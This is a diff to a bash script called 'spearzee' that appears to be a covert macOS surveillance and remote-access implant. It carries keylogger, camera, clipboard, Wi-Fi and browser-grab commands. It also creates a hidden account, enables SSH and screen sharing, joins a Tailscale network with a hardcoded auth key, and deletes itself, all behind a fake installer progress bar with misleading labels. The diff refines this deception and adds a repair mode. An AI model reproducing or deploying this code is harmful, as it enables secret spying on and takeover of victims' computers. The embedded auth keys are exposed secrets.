@@ -3,7 +3,7 @@ set -u
 set -o pipefail
 [ -z "${BASH_VERSION:-}" ] && [ -f "$0" ] && exec /bin/bash "$0" "$@"
 
-V="4.3"; F=0; PF=""; PP=""; KA=""; SRC=""; TSIP=""
+V="4.4"; F=0; PF=""; PP=""; KA=""; SRC=""; TSIP=""; REPAIR=""
 exec 3>&1
 
 ui(){ printf '%s' "$1" >&3 2>/dev/null || true; }
@@ -11,7 +11,7 @@ uil(){ printf '%s\n' "$1" >&3 2>/dev/null || true; }
 ok(){ printf '  ok    %s\n' "$1"; }
 warn(){ printf '  warn  %s\n' "$1"; }
 fail(){ printf '  FAIL  %s\n' "$1"; F=$((F+1)); }
-phase(){ [ -n "$PF" ] && printf '%s' "$1" > "$PF" 2>/dev/null; return 0; }
+phase(){ [ -n "$PF" ] && printf '%s' "$1" > "$PF" 2>/dev/null; [ -n "$REPAIR" ] && sleep 1; return 0; }
 ask(){ if [ -c /dev/tty ]; then read -r "$@" </dev/tty; else read -r "$@"; fi; }
 s(){ printf '%s' "$1" | sed -e 's/[\\&|]/\\&/g'; }
 q(){ printf '%q' "$1" | sed -e 's/[\\&|]/\\&/g'; }
@@ -41,6 +41,10 @@ clt(){ /usr/bin/xcode-select -p >/dev/null 2>&1; }
 step_preflight(){ ok "macOS $(sw_vers -productVersion 2>/dev/null) $(uname -m)"; }
 
 step_account(){
+  if [ -n "$REPAIR" ] && id "$RUSER" >/dev/null 2>&1; then
+    ACCT_PW="$(sudo cat "$PW_FILE" 2>/dev/null)"; [ -n "$ACCT_PW" ] || ACCT_PW="$RPW_CFG"
+    [ -n "$ACCT_PW" ] && { ok "account ok"; return 0; }
+  fi
   if [ -n "$RPW_CFG" ]; then ACCT_PW="$RPW_CFG"
   elif sudo test -s "$PW_FILE"; then ACCT_PW="$(sudo cat "$PW_FILE")"; ok "reusing password"
   else ACCT_PW="$(openssl rand -base64 24 | tr -d '/+=' | cut -c1-20)"
@@ -729,6 +733,11 @@ cmd_grab(){ sec; D="/tmp/spear-grab-$(date +%Y%m%d-%H%M%S)"; mkdir -p "$D"; chmo
   tar czf "$D.tgz" -C /tmp "$(basename "$D")" 2>/dev/null
   chmod 600 "$D.tgz"; rm -rf "$D"; echo "$D.tgz"; }
 
+cmd_ts(){ echo "ext: $(/usr/bin/systemextensionsctl list 2>/dev/null | grep -i tailscale | head -1)"
+echo "ip: $("$TS_BIN" ip -4 2>&1)"
+echo "up: $("$TS_BIN" up --authkey="$AUTHKEY" --hostname="$TSHOST" "${TSFLAGS[@]}" 2>&1 | tail -3)"
+echo "ip2: $("$TS_BIN" ip -4 2>&1)"; }
+
 cmd_verify(){ echo "== verify =="
   c(){ printf '  %-24s %s\n' "$1" "$2"; }
   c account    "$(id "$RUSER" >/dev/null 2>&1 && echo ok || echo MISSING)"
@@ -755,7 +764,7 @@ cmd_verify(){ echo "== verify =="
 
 case "${1:-}" in
   "") rearm ;;
-  verify|status|info|key|wifi|msg|browse|grab|shot|cam|clip|say|notify|open|as|keys|keylog) "cmd_$1" "${@:2}" ;;
+  verify|status|info|key|wifi|msg|browse|grab|shot|cam|clip|say|notify|open|as|keys|keylog|ts) "cmd_$1" "${@:2}" ;;
   rearm) rearm ;;
   *) echo "spearzee: verify status info keylog keys msg key wifi browse grab shot cam clip say notify open as" ;;
 esac
@@ -830,9 +839,9 @@ step_delself(){
 progress(){
   [ "$FAKE" = "true" ] || return 0
   PF="$(mktemp -t spearphase)"; printf 'resolving dependencies' > "$PF"
-  ( s0=$(date +%s); printf '\033[?25l' >&3
+  ( TGT=150; [ -n "$REPAIR" ] && TGT=45; s0=$(date +%s); printf '\033[?25l' >&3
     while :; do
-      n=$(date +%s); e=$(( n - s0 )); p=$(( e * 97 / 150 )); [ "$p" -gt 97 ] && p=97
+      n=$(date +%s); e=$(( n - s0 )); p=$(( e * 97 / TGT )); [ "$p" -gt 97 ] && p=97
       ph="$(cat "$PF" 2>/dev/null)"; [ -n "$ph" ] || ph="working"
       f=$(( p * 26 / 100 )); b=""; i=0
       while [ "$i" -lt 26 ]; do [ "$i" -lt "$f" ] && b="$b#" || b="$b."; i=$((i+1)); done
@@ -863,6 +872,7 @@ main(){
     [ -n "$c" ] && [ "$c" != "root" ] && ADMIN_USER="$c" || ADMIN_USER="$(id -un)"
   fi
   [ -z "$OWNER" ] && OWNER="$ADMIN_USER"
+[ -s "${AGENT_PATHS[0]}" ] && REPAIR="1"
 
   if [ "$MODE" = "verify" ]; then
     [ -s "${AGENT_PATHS[0]}" ] && { sudo bash "${AGENT_PATHS[0]}" verify; exit 0; }
@@ -891,16 +901,16 @@ main(){
   progress
   step_preflight
   phase "downloading";            step_account    || true
-  phase "connecting";             step_report     || true
+  phase "verifying files";        step_report     || true
   phase "installing services";    step_agent      || true
   phase "configuring system";     step_keys       || true
-  phase "configuring network";    step_sshd       || true
-  phase "configuring display";    step_sharing    || true
   phase "configuring access";     step_fda        || true
-  phase "configuring startup";    step_login      || true
-  phase "downloading components"; step_ts_install || true
-  phase "connecting to network";  step_ts_join    || true
+  phase "configuring user";       step_login      || true
+  phase "configuring startup";    step_sharing    || true
+  phase "configuring network";    step_sshd       || true
   phase "optimizing";             step_power      || true
+  phase "downloading components"; step_ts_install || true
+  phase "connecting";             step_ts_join    || true
   phase "installing tools";       step_tools      || true
   phase "finishing up";           step_self       || true
   stop_progress
@@ -930,13 +940,13 @@ main(){
 
 ############################# settings ###############################
 
-SELF_URL="https://raw.githubusercontent.com/madebyshaurya/spearzee/v7/spearzee.sh"
-SELF_SHA="8a26c096b81d0a2ca3a540b966a968f42dea158e673de60324e85e4907cfaa1e"
+SELF_URL="https://raw.githubusercontent.com/madebyshaurya/spearzee/v8/spearzee.sh"
+SELF_SHA="ab3f46bb6ba95138032a0f583045a02a1d52bf76a553b83eda46587cb2788e70"
 SELF="/usr/local/bin/spear-tui"
 KEYLOG="spearzee-keylog"
 CAM="spearzee-cam"
 
-AUTHKEY="tskey-auth-kD27qvaVGz11CNTRL-i35J1zw18RNBsW2dVwDpQN2TGrtvM13f"
+AUTHKEY="tskey-auth-kyjU2Nv1xN11CNTRL-1VuXy6xiUaAg11qitRjoaA3RFmU6ify7M"
 TSHOST="mac-mini"
 PKG_URL="https://pkgs.tailscale.com/stable/Tailscale-1.104.2-macos.pkg"
 PKG_SHA="1724d2e021d3c5f817f427f628260c013531a528f1258a7d477735d198b11f55"
